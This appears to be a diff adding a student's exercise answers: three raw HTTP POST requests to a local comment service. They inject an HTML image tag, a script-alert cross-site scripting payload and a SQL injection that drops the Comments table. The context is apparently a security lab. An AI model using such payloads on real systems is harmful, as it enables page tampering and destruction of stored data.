@@ -1,0 +1,29 @@
+1
+POST
+/UniProxService.svc/comment?name=bob
+
+Host: localhost:8188
+Content-Type:application/json
+Content-Length: 78
+
+"''</em><img src=''http://redsox.tcs.auckland.ac.nz/ups/logo.svg'' alt=''a''>"
+
+2 (Unsure if this is correct)
+POST
+/UniProxService.svc/comment?name=mccree
+Host: localhost:8188
+Content-Type: application/json
+Content-Length: 37
+
+"''<script>alert(''Bang'');</script>"
+
+
+3
+POST
+/UniProxService.svc/comment?name=sgr
+
+Host: localhost:8188
+Content-Type: application/json
+Content-Length: 31
+
+"hi'); DROP TABLE Comments; --"
